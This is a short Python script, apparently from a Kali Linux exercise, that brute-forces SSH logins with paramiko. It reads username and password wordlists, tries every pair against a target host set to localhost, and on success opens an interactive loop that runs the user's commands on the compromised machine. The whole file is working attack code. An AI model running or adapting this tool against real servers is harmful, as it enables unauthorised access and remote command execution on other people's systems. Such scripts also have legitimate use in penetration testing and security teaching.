import paramiko
import time
import sys

# Creating an SSH client
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

# Attack target
target = "127.0.0.1"

# Loading the list of users and passwords
with open("/home/kali/users.txt", "r") as usersFile:
    users = usersFile.read().split('\n')
with open("/home/kali/passwords.txt", "r") as passwordsFile:
    passwords = passwordsFile.read().split('\n')

# Function for interactive shell
def shell():
    while True:
        command = input("Enter a command or type 'exit' to quit: ")
        if 'exit' in command:
            sys.exit(0)
        stdin, stdout, stderr = ssh.exec_command(command)
        print(stdout.read().decode())

# Attempting login for each user/password combination
for user in users:
    for password in passwords:
        try:
            time.sleep(1)
            print(f"Attempting login with {user}:{password} ... ")
            ssh.connect(target, username=user, password=password, timeout=4)
            print("[+] Login successful as {}:{}".format(user, password))
            print("Preparing shell ... ")
            time.sleep(2)
            shell()
        except paramiko.ssh_exception.AuthenticationException as error:
            print("Incorrect login credentials! {}".format(error))
        except Exception as error:
            print("Something went wrong: {}".format(error))
